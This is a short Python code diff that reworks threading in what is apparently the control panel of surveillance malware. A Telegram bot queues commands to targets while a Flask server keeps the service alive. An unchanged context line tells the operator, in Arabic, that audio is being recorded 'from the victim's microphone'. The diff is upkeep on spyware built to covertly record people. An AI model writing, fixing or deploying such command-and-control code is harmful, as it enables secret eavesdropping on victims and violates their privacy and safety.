@@ -120,17 +120,19 @@ def callback_handler(call):
         queue_command(target_chat_id, "audio")
         bot.answer_callback_query(call.id, "⏳ جاري تسجيل الصوت من ميكروفون الضحية...")
 
-def run_flask():
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
+def run_telegram_bot():
+    print("[+] Starting Telegram Bot polling in background thread...")
+    try:
+        bot.infinity_polling(skip_pending=True)
+    except Exception as e:
+        print(f"[-] Telegram Polling Error: {e}")
 
 if __name__ == "__main__":
-    # تشغيل سيرفر فلاسك في خلفية العمليات ليظل الكونتينر نشطاً ويستقبل طلبات الويب
-    flask_thread = threading.Thread(target=run_flask)
-    flask_thread.daemon = True
-    flask_thread.start()
-    print("[+] Flask Web Server started successfully in background thread.")
+    # تشغيل بوت التليجرام في خيط (Thread) منفصل لمنع حدوث تعارض (Conflict 409)
+    bot_thread = threading.Thread(target=run_telegram_bot, daemon=True)
+    bot_thread.start()
 
-    # تشغيل بوت التيليجرام في الخيط الرئيسي لكي يستجيب للأوامر فوراً
-    print("[+] Starting Telegram Bot polling...")
-    bot.infinity_polling(skip_pending=True)
+    # تشغيل سيرفر Flask على المنفصل المخصص من المنصة أو الافتراضي 8080
+    port = int(os.environ.get("PORT", 8080))
+    print(f"[+] Flask Web Server starting on port {port}...")
+    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
